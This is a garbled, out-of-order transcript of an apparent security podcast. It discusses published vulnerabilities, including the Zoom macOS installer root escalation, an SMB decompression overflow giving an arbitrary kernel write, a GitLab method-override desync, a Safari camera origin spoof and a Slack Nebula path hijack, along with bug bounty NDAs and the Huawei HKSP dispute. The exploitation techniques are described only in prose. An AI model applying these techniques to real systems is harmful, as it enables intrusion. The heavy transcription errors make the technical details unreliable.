running a real server. There's a lot you can do but you know still for teenagers in the late 90s early 2000s. It was definitely a lot harder to do that and at that time people would test and report an end up charged with I'm so I think that's kind of where some of my views on just letting the company do whatever comes in. So now jumping back to the safe harbor Safe Harbor is just that you won't be charged with the crime. What's happening with bugcrowd hacker one with private bounties is that you'll basically be told sign this NDA you'll be added to the private Bounty and then you can report your vulnerability. So you can talk about the show before you can disclose or they basically set a gag order on anywhere. You can't talk about here issue if you want to disclose it to them. Or if you want to do the responsible thing and\", \"start\": 2272.0}, {\"speaker\": 3, \"line\": \" yeah, basically trying to punish people for for going the right way. Well, so\", \"start\": 2465.9}, {\"speaker\": 1, \"line\": \" here's the other thing though and it is worth noting like most vulnerability assessment have an NDA, you know real world assessments when you're working for a company that's been hired to do an assessment. You have an NDA. I can't, you know talk to you about all the vulnerabilities I found in whatever clients I've had. Now there's an NDA there like that is a pretty standard process. It's just like you don't want to effectively humiliate your client so it is different with these. Well, so again that kind of comes down. I definitely there are cases where I don't know. I'm just trying to think here if I can come up with a good example where perhaps it would be a good idea not to publicly disclose or at least not and when we talk about it publicly disclosed generally where I'm assuming I'm assuming things have been patched and have had people who've had time to update. And in that case like know as I did say earlier, actually, I do think all vulnerability should eventually become public. So there's no case where they shouldn't at the same time when a company is hiring, you know, a pen testing firm. Any funding is going to be damaging to their reputation. No matter what so I can understand the company not wanting to expose that and I want to be yeah, we had these vulnerabilities and thus they're hiring researchers do it at the same time. I mean, yeah, I would like to see those public but I get why company wouldn't want that out there, especially if it's pre-release products. I know for me A lot of times we'd be brought on kind of during the standard release cycle. So it's like we are about to release this get the security testing on it just before it actually gets released. So then those vulnerabilities never even would've made it to the public at\", \"start\": 2469.2}, {\"speaker\": 3, \"line\": \" all,\", \"start\": 2592.7}, {\"speaker\": 1, \"line\": \" and I think I can at least Understand if it's part of your kind of secure development lifecycle. not publicly disclosing those\", \"start\": 2594.0}, {\"speaker\": 3, \"line\": \" vulnerabilities I think part of the reason that like the non-disclosure like security researchers taken issue with the NDA is they'll basically use it on researchers who submit issues so that they can't talk about the issue publicly. And like you said, they can't damage the company's reputation\", \"start\": 2602.6}, {\"speaker\": 1, \"line\": \" was so that's a little bit different and external researcher versus being the hired by the company to do\", \"start\": 2619.7}, {\"speaker\": 3, \"line\": \" okay now is make certain point like talking about external\", \"start\": 2626.6}, {\"speaker\": 1, \"line\": \" researchers. This is I was making the point that most assessments. So do happen under an NDA. Most okay assessments aren't bad. Well, I don't actually know the numbers to compare like literally like our most requests generated by bounty hunters or by hired can hire Consultants or whatever but generally speaking there are a lot of Assessments that do happen under an NDA that are just they're hired to do it. It's not under some sort of public bug Bounty that said there's a trade-off when it comes to public bug bounties. And I'm going to and I'm going to say like I don't agree with having an NDA to report a vulnerability. In general, I mean, I think more Andy like a timed NDA where it's like you can talk about this until it's patch or until we reject the issue or something. I think that's fair. Like, you know, you can't report this about our can't report this bug to us and then just start talking about it immediately give them time to fix it, you know, basically Force coordinated disclosure. What do you disagree with that or kind of\", \"start\": 2628.9}, {\"speaker\": 3, \"line\": \" agree? I think that's fair.

They wanted him to accept the Bounty and sign an NDA that would have forbade him from you know, publicly disclosed in the issue and I think the reason that researchers are wary of that is they're worried that they're basically Going to by The Silence of the researcher and they're not going to fix the issue or they're not going to take the issue seriously and fix it like way down.

So what I could see is like having a plant, you know, a company signs up with hacker one because hacker one does offer a lot of benefits to come near homes having the bug triage having some of that so they're not getting all the garbage report and then they get a little bit of tension if you offer a bit of money, there's and how One just makes it easy for the company's so hacker wants in a good place. So to also start pushing those companies towards a better model where their disclosures and hacker one doesn't do this, but I think something hacker one could do is a company signs out with them. Okay, you don't need to disclose anything in your first year with us. But in your second year, you know, you need to be disclosing, you know, all of your critical vulnerabilities. Or you know and in your second, or maybe maybe they'll go the other way like but having some sort of step-by-step process were over time. They're going to increase the amount of disclosure. They have and working them up towards that I think that's something hacker one could do they don't do it, but given the position that they're in they could easily leverage their position to walk to do something like that, which I think would push security forward in general.

It's a contest and I think that makes a\", \"start\": 2932.0}, {\"speaker\": 3, \"line\": \" difference. You're not an employee. You shouldn't be getting paid a minimum wage for bug hunting like they're kind of suggesting there.

Seeing actual client information you should be pulling down actual, you know credit card information or something like that that said that Specter was saying I'm not a lawyer perhaps with gdpr that doesn't matter and just if you have a vulnerability that could have been used to breach this data.

And it'll send your ntlm hash over to the Target server. That's the actually it's kind of an issue with Windows. Just sending your authentication by default. Although it is kind of a sane move to send. Credentials you can turn it off by default. I'd recommend doing that and then you just have to manually basically get it to send which I think would be a more sane default, but I kind of understand the history here.

We're in the staff chat. They actually asked like do we want to you know, add everybody about this because it's such a huge issue. It's just like one they don't normally alert people about issues at all to Don't click links like this. Isn't that big of an issue? Don't get me wrong. And actually I will say like for Zoom doing it like zooms. You said a lot of business contexts where you're going to have these sorts of Link's flowing around. It makes sense to make them clickable.

Our next one is actually a zoom topic\", \"start\": 3585.6}, {\"speaker\": 1, \"line\": \" to actually to vulnerabilities in this one. Yeah, this is two things one is the local privilege escalation to root on I think both of these. Yeah, both of these are on OS\", \"start\": 3590.4}, {\"speaker\": 3, \"line\": \" X so they're both Mac OS based issues.\", \"start\": 3604.7}, {\"speaker\": 1, \"line\": \" Yeah, so Both of these are LP2 wrote and code injection that gives you access to the microphone and Camera. Basically, they just discovered and this was another one that I saw getting mentioned a lot witch. It's at least I'd argue about it one. It's more on zooms all it's more. It's more zooms fault and maybe a little bit more useful in terms of actually doing something with it. So the gist of the first one though local privilege escalation is that the zoom installer uses this lovely API authorized ex came with privileges. Basically just a way to execute with enhanced privileges are execute is roped. The API itself is documented as being insecure shouldn't be user. I believe it's even deprecated on OS X but it doesn't validate the binary. It doesn't make sure it's signed or anything like that if the binaries read-only are can't be modified. There is otherwise protected it's still kind of okay to use it. but but with that it doesn't validate so if somebody could change the binary. They're basically to give her a note Zoom. The binary of Ron's is basically a bash script run with route. So during installation that run with root file as a period of time where it isn't protected as the installer unpacks the package file into a temporary user writable location. So somebody could exploit that by waiting for that file to eventually exist and be created and replacing with their own content and Then the installer will eventually end up running with roped. Whatever they put into that she'll file. Yeah terms of go ahead.\", \"start\": 3608.6}, {\"speaker\": 3, \"line\": \" So I'm just going to say you are you were cutting out a bit for me there. So like I apologize if I re it reiterate over an issue or you already touched over but part of what makes these issues a little bit more impactful to is it was actually discovered that the Mac OS installer would perform the install without you ever even clicking install because it abused pre-installation scripts. So on its own that shady but, you know, not necessarily malicious and But how it also gets that route privileged on the script that you're talking about that could potentially be hijacked is it'll prompt the user for root privileges. If you're not in the admin group, it doesn't prompt for root privileges as itself. It says system needs your privilege to change. It's almost like intentionally misleading to make you think that the Mac operating system needs your permission not zoom itself. So there's some shady issues on top of it. They kind of make it like even worse than that. I'd have been as well. But yeah, sorry. Yeah.\", \"start\": 3727.6}, {\"speaker\": 1, \"line\": \" Well, I was just going to add like actually trying to exploit this though is basically\", \"start\": 3788.0}, {\"speaker\": 3, \"line\": \" You need local access\", \"start\": 3794.9}, {\"speaker\": 1, \"line\": \" what you need local axes and you need to wait for that pre-installation Tappan. Yep, so you're not getting access to this like it takes a lot of patience for malware to eventually get this. And with that, I mean that definitely limits the usefulness of it in the second one here in terms of its code injection that gives you a mic and camera axis. It's effectively dll injection own OS X OS X does provide a hardened runtime Library validation which prevents prevents you from loading either are only allows you to load Apple libraries or those that are signed by the same team ID as the application itself.

We have a zi zi blog post about a use after free in the VMware Workstation DHCP server, which was submitted to them by an anonymous researcher last month. So unlike some of the zi zi stuff we've covered in the past. This isn't like a working backwards from like a patched it for anything like that. This is an issue that was submitted to them. So the article first does a bit of a dive. Into how the DHCP release message Handler works and the gist of it for understanding the issue is it will end up copying the data from one leash structure to another so like source to a destination and it thusly structure contains various information like the client IP address the hardware address and a unique\", \"start\": 3953.7}, {\"speaker\": 1, \"line\": \" identifier. Yeah, and just and that's the supersede least function as you're saying just copies from basically the old one to the new one, but I think the name kind of met matters are in terms.

They literally just say when those two messages like DHCP discover followed by the release messages repeatedly received this happens. It doesn't really go into why that happens, but eventually it does happen there. Well, yeah, I mean, I'd love to know but I guess if you're writing the exploit, it doesn't really matter. You just know if you smack you get this to happen, you know, you don't need to dig into it. So I get why it's not there.

You ID field didn't point to the same location before calling the free so very simple patch the article didn't go into detail of how to exploit this to perform the VM Escape.

So there were some pocs out the for this bug before But all of them were they were basically just denial-of-service pocs. Nothing forgetting code execution though. The advisory said the code execution was possible because they labeled it as an RC e so this post explores how they actually exploited it to get code execution and not just a Das. So first the detail the specifics of the bog or rather I should say bugs because there's multiple cascading integer overflows in this code. So for those who are watching we can bring up The code on the screen here and you can cause overflows on two different fields in here that can cause like propagate issues further down the line. One of them is on the offset field and the other one is on the original press segment size field and after these guys played with different combinations of overflows for these two Fields. They found the most promising combination was to use a reasonable offset value, but a very large original compressed segment size value and what would happen here is due to the integer. With the addition statement the allocation when it up being\", \"start\": 4537.0}, {\"speaker\": 1, \"line\": \" smaller than yeah so Fields, I do want to interrupt you really quickly and just kind of mention what's going on with this. So you get the SMB packet that comes in and it contains the raw data and obviously it's most that most particles do it includes a header that header your actual data the raw data may be compressed. It may not be or maybe it is always compressed because this sorry this is Function in particular is dealing with stuff as always compressed. It's decompressing the data. So it'll take that raw data. It will allocate a new buffer and then it will take the compressed data. It'll decompress it into that buffer and then it will prepend the raw data any data that was in there. That wasn't compressed. So that's where the header offset is basically saying like all the data before this offset. That's just it's basically it's providing the offset into the data block to where the compressed data starts. So all the information before that offset just gets men copied right into the buffer to the start of the buffer and the compressed that is the compressed into the new buffer starting at that offset. So just to kind of explain something valleys there like the offset is how far into the data block the data that is compressed. That is the original compressed data size value or field is of course, the original compressed data size are segment size, which I think is self-explanatory. And obviously you can control both of those in the header. So deciding all the proof of Concepts just gave it, you know, 0x F of f so minus 1, which of course are like the biggest Value possible or minus one if it's signed effectively overflowing the integer causing a crash when I would try and access this memory eventually or try and write to memory there sir. You can go on though with your explanation.\", \"start\": 4619.7}, {\"speaker\": 3, \"line\": \" Yeah. So like you were saying the POC is a were out there were just a DOT because they used a very large value. We would write way out of bounds of the buffer, but they ended up, you know controlling it more because you do have quite a degree of control over that value and They found that they could actually smash the header that you were talking about of the packet on the Heap. And so they were originally going to try to trigger a use after free because there's a piece of code in the snippet that was on screen that would trigger a free on a certain condition and they were going to try to force that condition with memory corruption, but when they tried it they accidentally ended up finding a far better route to exploit this and they basically found that the decompressed function that gets called updates the final. Sighs value to the compressed buffer size. So the mem copy down below is hit and then they can actually control what buffer is used for that mem copy for the sore for the destination so they can basically get an arbitrary right through the mem copy. So, you know\", \"start\": 4746.1}, {\"speaker\": 1, \"line\": \" the answer so I do want to add in a little bit that they're a little bit I think you kind of skipped over. Okay, so when they have the user buffer, obviously there's that Target buffer that's been allocated. They kind of control the ultimate size of that as we've mentioned because they control you know, the size of the data. That's when we dealing so they know what the size is going to be. So what they're able to do is they control that in such a way that the It can be allocated in several different locations and they talked about this a little bit as I believe there is a pool forward and there's a look aside list for some it all comes down to the different sizes larger. So large applicate our sorry large allocations will just fail anything larger than 16 megabytes medium allocations larger than 1 Megabyte less than 16. We'll use this buffer pool and smaller ones less than Meg will use the look aside list the look aside list that they Implement here includes Med information in line. With the Heap data, so they show it on screen here you end up having the user buffer that gets returned every turns this object that includes a pointer to the actual user buffer and following that buffer at the end of the buffer is an allocation header structure that includes that is kind of the object that gets returned. So Avery turns that allocation header and that includes a pointer over to the user buffer rather than just returning that user buffer, so it's not Not it's not working quite like Matlock. If you're just expecting to return a block of memory returns an object that Sorry, I was distracted by the comment and chat, which I definitely want to deal with after I keep talking about this. But anyway, so the allocation header struck is where they get if I come back up here is where they get the user buffer. Address for so you control the decompressive data or sorry you control the raw data in the packet that's going to be copied to that location. And because the Overflow that you can get with the decompression, When it's decompressing the data you control what that pointer is pointing to. So you control the data that's going to write and you control because of overflowing that metadata in the heat in the heat that they create you control the address. So I just wanted to cover that little detail. That's their overriding an address in kind of like the Heap metadata not in the protocol header.\", \"start\": 4807.2}, {\"speaker\": 3, \"line\": \" Yeah, so, you know when you have arbitrary right in the kernel, it's basically game over that's a very like it's stupidly powerful primitive and they ended up using it.

Yeah, I think that's what's happening there. That being said, I don't think I have much more to add on that. I think we can move on to exploiting parts are differentials and get lab so our next issues directly and get lab and it's from their file upload functionality it seems and it's kind of a cool attack because it's similar to the HTTP desync attacks.

So the work horse Takes that request upload the file and then it rewrites the request and passes it off to get lab rails with the proper path. Now. Normally it wouldn't be possible to control any of the put request from Workhorse to rails as that's all handled internally, but there's an issue due to the method override functionality.\", \"start\": 5250.5}, {\"speaker\": 1, \"line\": \" Well, so I think should also mention here is that we're course is as it's a reverse proxy.

Some of them get do get Modified by Workhorse of this example of all the pull request to the API packages / Conan and whatever path following that all of those end up getting dealt with are getting Modified by Workhorse and then kind of turn into another request that hits the main rails application or the main rails API, but if you unmatched routes and up just being Passed on unmodified two rails. Yeah, that's kind of an important detail here where the desync happens is Workhorse has no knowledge of this method override whereas rails by default has this rack method override middleware that looks for underscore method as a parameter or X HTTP method override as a header, and we've talked about issues with method overrides before. Yep. We have it's definitely it's A common method for I mentioned with dealing with fire web application firewalls that might not be aware of it, you know kind of a similar deal here with the reverse proxy. It's not aware of that. So it seeing it seeing you know, probably a post request or something like that coming through like okay. I don't know how to handle this post request. So I'm not going to worry about it whereas as web servers like oh, hey, I got a pull request because it's get it gets overwritten so you can kind of Maybe start to see where this is going.

Just what it gets it actually has a wife list of acceptable paths and it also had slash temp to that but they have a whitelist. So even with that they still kind of protect the endpoint a bit. They don't just trust Workhorse to give it exactly what it needs. Nonetheless. Basically you can still get it to work with basically any file that exists in slash temp or any other acceptable directory. So you would have to know some of those file names you can make some guesses. Is about what might end up in temp? But you would have to know that actually abuse this issue.

So then that could be done at a universal layer where it's just looking like is the signature like does the signature match that URL like signing the URL basically, so then if it ends up being a different type of request that a little get caught there so I could see some ways that's being done.

I mean it it exposes a loft that thought process which I think is valuable. I kind of see how you work your way to this fairly complex issue. So starting off with something background with it on OS X and iOS. Basically you have you have the permissions for like an application access the camera needs to have permission to do so. The thing is Apple applications actually. Get that for free. Any Apple application is allowed to access the cameras allowed to basically have some prayer sir. The microphones. The other thing is allowed to access that without actioning to prompt for information. So Safari being an Apple application gets that for free, but it tracks it itself in order to prompt you for for like websites to request specific permission. So going from that that's kind of your background there. Yeah, the that's kind of the security model around. How you get x to the camera? So what this walks through is first of all, it starts looking at how to Safari. Keep track of your website's. How does it know? Why one website is how does it keep track? Thanks for same origin policy and basically they noticed and I'm not going to walk through the entire. An issue, but I'm just going to point out more some highlights, but they noticed in there that when they have like the websites listed, they'd be on like a w-w-w DOT and only example.com would show up. So they kind of notice just how you know, it's probably parsing out for the hostname and what they noticed eventually was that how would parse the host name is it would ignore the protocol so they show the example of going to fake colon slash slash example.com Arm which would count as having example.com open, so it ignored the protocol. So what it did was it would just grab between the colon slash slash and the next / to get the host name? Which kind of makes sense Until you realize that there are some protocols that are supported or pseudo protocols like file / / or blob view Source data things like that or JavaScript would be probably the more common one that don't have a host in it, but it will still load at that same way. Then they kind of talk through how they certain no Singham of some other issues like if you had a domain with a - and a DOT next to each other how it kind of bugs out, but effectively they found for example that they could use file there's a they can use file, you know Skype to Skype.com and it would be loaded as though it's origin was skype.com was the one example that kind of would come up there. However are sorry. They would use JavaScript to change location dot hopes to be skype.com rather than actually doing it in the URL. I'm said they talked about a number of different tricks that they end up using here. So they kind of worked out. So they're able to kind of get control of the origin file while the kind of worked. It doesn't support mobile. So they didn't actually go that route they kind of deep diving into blobs. But what happens with blobs is they end up talking about these opaque origin. So what happens when a blob if you're not familiar with a blob lobs are in JavaScript, you can go and do like a new blob and then give it basically a file that it's going to write and a meta or mime type for it. I can give it that information. Then you can it'll give you a uid that you can then load up as though it were an actual file were an actual URL. So just kind of creates a kind of in memory and you do that with JavaScript. So it's a little bit special. So what happens if you know, how does it get the origin for blobs? and it deep sea dives into that couldn't just You can't just create a blog from skype.com. For example kind of dives into what winds up happening eventually is he figures out that in some cases with The Blob Origins you could end up with a empty origin rather than annul origin or an opaque origin, which just doesn't quite serialize. It actually gets tray is empty were thinks the origin is literally just colon slash slash. so what ends up happening when he's able to trick the origin to be colon slash slash what she ends up only being able to deal with you in theory or he discovered it by only manually typing in the URL not by getting it through any sort of automated means although ends up using another trick to kind of get around that huge using pushstate to effectively change what that Origins up looking like, That ends up happening because you have the colon slash slash as what he thinks. is the origin so then when you use pushstate Interested if you set the push stay to skype.com. We'll just how you change the url without actually changing it's used by gesture. So Ajax stuff, you'll change the url without actually going to make a full request to a new page. You can just change the url kind of magically with JavaScript. That's what pushstate is or part of push States in particular that's changing your history versus replacing I won't go down. Path though, but because of because of finding that blank origin the colon slash slash when he sets the thing to skype.com. It's thinks he's just setting a path not changing the how the other area of safari will actually parse it as the domain being skype.com. Now it thinks it's doing something else. So it sets the path to some like skype.com something that has permission to use the camera. So basically figure out how to programmatically create a document with any sort of spoofed origin is next hurdle was getting around so you can only open the camera webrtc needs to be encrypted needs to be over in theory that's supposed to be needs to be over HTTP and practice files are one place where so file colon slash slash are one place where you'll have I'll say it's not an HTTP request, but you can still open the camera and that's because Safari will trade basically anything that has no origin the file you are eyes data. You are eyes as a secure context and that's obviously there to help developers. That's why files kind of get treated as being as here context even though it's not necessarily secure or at least not here in the sense of being over http. discovers that discovers that you can easily create that sort of opaque or gen using a pop up from a sandbox iframe So if eventually, you know using a pop up from a Sandbox iframe doesn't have any or doesn't have or has an opaque or genset.

We've got a hacker one report from James Hancock. This is impacting slack. I believe it was yes lock relative path vulnerability results are results and arbitrary command execution / privilege escalation. $750 Bounty for this it's not on the Like slack client this uses nebula, which is kind of this networking tool that slack has a use between quotes crate like this mutually event K peer-to-peer software defined Network. It's the language out of their GitHub repo for it. Basically created to provide like a mechanism for various groups of host communicate securely across the internet. so nebula in particular just of this issue is really simple. It uses a relative path. When does executable command? It just uses ifconfig or router on Windows uses netsh. It doesn't give the full path or the absolute path like essman ifconfig. So what that means is if you can control the binaries in the path before it finds the original one you're able to get execute. as a privileged user whatever binary you want it to run. So essentially when you call just for ifconfig, for example your systems going to lock a well as iif, it's quite look at your path environment variable. It's going to get all the folders elf that's going to go in order first folder in there is ifconfig in here. No, OK second folder and there's I've config in there. No, OK third folder. Okay. Here's ifconfig. Let's execute that. So an attacker who can place a binary of the same name somewhere in that path before Actual binaries Falcon get to be run. Straightforward issue just use the absolute paths when you're going to execute something don't assume don't assume the setup. It does require obviously somebody that can that's in a position to place a binary but\", \"start\": 6549.3}, {\"speaker\": 3, \"line\": \" Because my path as well, yeah,\", \"start\": 6685.6}, {\"speaker\": 1, \"line\": \" well or place the binary within the path you could modify path. That's the easiest way to deal with just you know, put temp in the path or something and then X here and attempt, but it just needs to be in the past somewhere. So it's like the user doesn't need to be able to do that. They just need to be able to get a file though odds are if you're able to get a file wherever you want with whatever name you want. You probably can also mess at least somewhat with the environment variables. Yeah, although that actually ends up being a point of issue that they have chat with reproducing that. So you can go ahead and just read that they had a little or the triage team had a little bit of issue actually proving. This was an issue just using pseudo because pseudo would use its own path information. It wouldn't what a huge the executing users but The difference being here that it's executing already as privilege and interest executing a Tom either way. You can read about that discussion. I didn't think it was too interesting. I just thought was worth breaking off. Yeah. This is definitely one of those combinations and it's really easy not to make use an absolute path. It's a little bit less portable. But it's better if basically happens on a lot of application and\", \"start\": 6688.3}, {\"speaker\": 3, \"line\": \" straightforward. Yeah, I mean I was a bit surprised considering like the impact is limited because you do need that level of access to pull it off this gets this question because nebula runs as root but I was a bit surprised at the Bounty was as high as it was sudden heard $50, obviously that's cool for the researcher, but it's a bit higher than I was expecting.

I want to say like two episodes ago maybe but hasn't been that long since we have haven't had paper but anyway with this one it's they called a physically realizable adversarial examples for lighter object detection it is not they don't actually realize it physically this they just they do all this digitally to see how it would detect something they don't actually pull this off which is unfortunate but I do like talking about the ones that could be done in the real world it's not it doesn't require access to the Imaging system\", \"start\": 6841.8}, {\"speaker\": 3, \"line\": \" as yes every wire access to the can bus or anything like that\", \"start\": 6888.8}, {\"speaker\": 1, \"line\": \" well I just meant like yeah sometimes the attacks will assume when they're working against the camera in particular you know those whom they can just modify all the pictures Clean like make minor Pixel Perfect modifications. This doesn't this assumes you could put effectively that you could put something on your roof and it will no longer detect you as a car. Yeah, which is the gist of this thing what they noticed was that a lot of training data doesn't include objects on roofs cars, which you know absolutely happens in the real world. Just not so much like it's a little bit uncommon so I can understand that uncommon assuming translate training data where it's just not really there. That's what they do is they digitally manipulate what the point Cloud what if look like and see how it gets detected and I will jump pretty much right to the results unless you have something to say about it Specter.\", \"start\": 6891.9}, {\"speaker\": 3, \"line\": \" I'd wanted to say this this like idea of investigating this route of attacking object detection doesn't seem to be new they do point out to some previous work that was done on it though.

For example, they are basing that's just off of a more generically trained model and so it is worth pointing out like just because they find these issues doesn't mean it's like, oh, well the next test like you buys necessarily going to do the same thing. This is yeah worth worth mentioning that but getting just right down to it. Basically they just mocked up different objects that could be on your roof and well they started by just mocking him up to see what a would get classified as and it actually did a reasonable job at Detecting the vehicle despite the fact that there is also a couch on the roof or a canoe on the roof, which I you could expect reasonably that\", \"start\": 6992.4}, {\"speaker\": 3, \"line\": \" I don't know.

Do but it looks like you know, the canoe was a little bit malformed or whatever. They found a much greater degree of success like with their adversarial couch. The car would be detected as a couch 68% of the time. So there you are. Just just going down the freeway in your cabinet 54.1% of the time. So yeah, I mean it's it's a straightforward attack here.

They do directly manipulate that data. I just think they do it in a fair way, you know, they're trying to simulate when you could really do so, I think that's fair like said, you might get pulled over for something unsafe loads, but at the same time You know, you're probably not doing this and just driving down the freeway for hours. It's probably if you were willing to use this and I mean, I don't know if any actual campaign or anything that would have done something like this. Like I guess it wouldn't be a campaign.

And one of the bugs is in the VGA emulation subsystem, and it's an out-of-bounds access. Pallet memory via integer overflow and that memory is used for like pixel entries for DACA dress reading right mode registers. And the problem is they end up using 32-bit indexes when they should have been 8-bit indexes because only values of to hunt to 256 expected and the wraparound is expected on that too. But because they use integers instead of chars or un dates you could actually end up reading or writing out of bounds and because you get those two, To both read and write those two Primitives together very powerful because you can use that to both leak and corrupt Heap data the other bug seem to be unrelated. That was a bug in the firmware configuration device, which allows the guests to retrieve host provided information like the virtual CPU count for example, and it's kind of similar to the first issue its assigned in this issue and one of her Quest structures. So something that should have been unsigned is treated as signed and because of that there's a discrepancy between the allocation a The copy length and you end up getting an overflow this article goes through all the technical details of both vulnerabilities and how the first one can get code execution the second one.

So yeah next week will be our last episode. We're coming back on September 14th, which is like Midway through September. So, you know, what will be on for a few months just over the summer while we're you know working on stuff but I want to let you guys know that in advance, you know, that way you guys don't come here and like two weeks and then there's there's nothing here. So yeah, we just wanted to get that out of the way and the next thing we have before that before we get into any like new news is actually an update to the story that we covered last week with the Huawei. Interestingness that we saw so last week we covered a colonel bug that was super trivial and it was like a security subsystem. It was really it was really awesome because there was a very blatant buffer overflow and it was the security subsystem. It was called HKS P. So you wanted to say something there zi.\", \"start\": 9.8}, {\"speaker\": 2, \"line\": \" Well, yeah, this was kind of my update on that because I had I made some comments that maybe are true. Maybe you're not true. It's not clear at this point gr. Securities also. And update their posts, but the key thing here is with HKS B, which was the Huawei Colonel self-protect system basically email was sent out on Friday before the last episode with these patches various security features to basically prevent messing with the colonel trying to stop some exploits. I'll during when we talk about that. I mentioned how it appears that this wasn't somebody from Huawei that it wasn't actually Huawei sending this out instead. It was somebody in this is in the first line of the get Hub on the readme itself makes a mention that Actually looks like they might have removed the repository. Oh, no, there it is. They just rename debt, but on that first line there mentions that that basically they're not from Huawei or they're not this was done on personal time. So I took that to mean that this person had worked on this, you know on their own whether or not they were with Huawei they do use while ways Organization for their account, but that's just like typed in it's not an actual like connection to when he Huawei corporate account. Despite that what's kind of come out now is one that the comment actually with that statement saying how they're not actually how this isn't actually from Huawei while the committee for that was on Friday before they emailed the Linux kernel hardening list before gr. Scary did that like it was in theory in there before that? The actual push event wasn't until Monday morning after the response had already come to the from gr. Security and all that. So basically after people want shop back about the vulnerability and there and just bad coding then this mysterious commit backdated to Friday was pushed which definitely kind of leads to A bit of a question as to\", \"start\": 78.2}, {\"speaker\": 1, \"line\": \" it is pretty suspicious. Yeah.\", \"start\": 218.5}, {\"speaker\": 2, \"line\": \" Yeah, at least kind of to the question of whether or not while way is behind and trying to backpedal a bit or if this is just kind of Somebody who genuinely was just working on their own time kind of built this and it got associated with Huawei somewhat unintentionally, gr. Security pushes that this guy is an employee of Huawei one of their highest Bible is going\", \"start\": 220.5}, {\"speaker\": 1, \"line\": \" to say not just an employee. They say a level 20 principal security stuffer, which is like the highest level apparently at the company. So\", \"start\": 247.5}, {\"speaker\": 2, \"line\": \" yeah, so I don't know what they're in for me what their sources for that. I don't have access to that. That said I do feel like the commit being backdated is definitely very suspicious. I mean had they just added that commit after you know, gr. Security called sounds like oh, I better make it clear that hey, I'm not actually, you know with Huawei or whatever and Huawei I just chose to use that for some reason, you know, it won't be a little bit different but the fact that they backdated that commits definitely, you know, something's going on with that. So I'm kind of a little bit more willing to toss some belief into the idea that while way was maybe planning on using this obviously they weren't using it yet. There's definitely like there's definitely the possibility that's not that that genuinely is just somebody that you know, he also just worked on this on their own time whether or not he's a principal security or developer, whatever.\", \"start\": 254.1}, {\"speaker\": 1, \"line\": \" I have a question here too. It's like I'm looking at the repo right now. All I see is the top patch file was it always like that?\", \"start\": 321.5}, {\"speaker\": 2, \"line\": \" Yeah. It was just the readme in the patch\", \"start\": 328.4}, {\"speaker\": 1, \"line\": \" file and and it was like that even before like all the Jer security. Okay. I just want to make sure because that seemed kind of weird that the repo seen more empty than I remember it being\", \"start\": 329.9}, {\"speaker\": 2, \"line\": \" but no that was just it was just that at least on Monday. I can't go back further than well. Why I say Miami last Monday? Yeah, I can recall that was just the two files then. Okay,\", \"start\": 339.1}, {\"speaker\": 1, \"line\": \" so I mean, yeah, the commit date is pretty suspicious and it's kind of worrying that they're top security staffer is putting out code like this it is is pretty questionable.\", \"start\": 352.1}, {\"speaker\": 2, \"line\": \" Well, so on that like I'd be willing to believe that their focus was on these patches and what these patches could do and protect from whereas the particular vulnerability that gets called out if I recall correctly. It's Was it not in like one of the handlers by just basically the caller? Basically? Let me see if I can find it from dear security again. okay, stay right, so Yeah, it was just in the ring\", \"start\": 360.9}, {\"speaker\": 1, \"line\": \" callback for the aisle or for the device.\", \"start\": 396.1}, {\"speaker\": 2, \"line\": \" So yeah, so sorry. I was thinking. I was trying to come up with a charitable way to explain it away. I just being like, okay. Well, this was just kind of some throwaway code. The focus was on all these checks and you know Screw adding in all the security elsewhere. Let's focus on these checks which are kind of the primary. functionality of this is kind of what I was thinking\", \"start\": 398.7}, {\"speaker\": 1, \"line\": \" but It is like it is just really blatant lie, like just not\", \"start\": 428.3}, {\"speaker\": 2, \"line\": \" security. No, I like it. All there's definitely just no thought towards that here.\", \"start\": 435.7}, {\"speaker\": 1, \"line\": \" Yeah, but I would say going I will say even though this like that commit day does look suspicious and I while we didn't know it at the time there is a security staffer like this guy is not just, you know random person out there. That's not affiliated with Huawei. He does work at Huawei. I I do think it's it still seems Reasonable not to attach it to Huawei just because looking at the past repos on the account. You can tell it's an individual account. It's not you know, it's not a corporate account or anything like that. I think that's one of the I want to say. It's the only one but there might be like one or two others but like there's a lot of repose that aren't affiliated with anything while way attach that account as well. So it does seem reason. I don't think it's reasonable to attribute that to Huawei like Huawei never tied their name to that code. So Even though there is like a bit as of a suspicious story around it and people like the common thing I've seen is this is a back door, right? But while we're trying to put some druggie just mentioned\", \"start\": 440.9}, {\"speaker\": 2, \"line\": \" that in chat, actually the whole situation is weird. Some people claiming it's a backdoor attempt but it's not even remotely subtle. Maybe there is a miscommunication between employees and Huawei or maybe you always backpedaling because of the shit\", \"start\": 500.0}, {\"speaker\": 1, \"line\": \" code a lot more likely than a back door in my opinion.\", \"start\": 513.3}, {\"speaker\": 2, \"line\": \" Yeah, so when it comes to the back door like I get why People are always cautious, you know Chinese companies therefore, you know trying to can just make them do whatever the thing is with that generally speaking the bag door from China is all the data is passing through Chinese servers. Therefore it can be logged collected and then China is allowed to store it or sorry. And then the Chinese government is basically up to accept when they want to and I believe that's basically mandated by law that they will have to Give access to that data, they collect so the back door is just fact, they have all the data passing through already. And that's where Loft concern from trying to comes from that said, I mean, obviously there is valid concern while way building out anything that's going to be used by, you know, obviously they have phones could be used by government officials. Those could be back doors like there's reasons to that backdooring also, But a lot of the Chinese back doors are really just the fact that the government's there when it comes to something like this. I'm definitely I'm not I'm willing to say like Huawei doesn't want their name on this. Obviously. I don't think it's a back door, even though it could it be used like that sure. It's definitely very obvious. Like I said, I do kind of want to have that more charitable understanding here and just say that okay, this is kind of like Oh, it's in the right. It's not the important part of the application. They just kind of wrote row there right Handler here.\", \"start\": 516.9}, {\"speaker\": 1, \"line\": \" And just had the lesson that system like it's not their main area. I see what you're going with\", \"start\": 615.3}, {\"speaker\": 2, \"line\": \" that. Yeah like that Focus what you want to break our all those checks that\", \"start\": 620.2}, {\"speaker\": 1, \"line\": \" they're actually doing on everything.\", \"start\": 623.9}, {\"speaker\": 2, \"line\": \" You can implement this securely quite easily.\", \"start\": 626.4}, {\"speaker\": 1, \"line\": \" Yeah, like what I'll say on the back door angle is kind of like what your view is saying in chat is if you're going to do a back door, you don't want it to be super obvious like that. If you can plant a bug plant the subtle one because you don't want other people to find and Potentially expose the bug so you are forced to fix it or you just don't want other people abusing that bug, you know, if you have the ability to plant a bug you don't want to plant something that obvious that's just really stupid. So that's why I think it's not I don't think there's enough evidence really to suggest that it could be a backdoor. I think that's kind of a bit tinfoil hat to tinfoil hat for me.\", \"start\": 629.9}, {\"speaker\": 2, \"line\": \" Yeah. I mean people definitely like hating on kind of 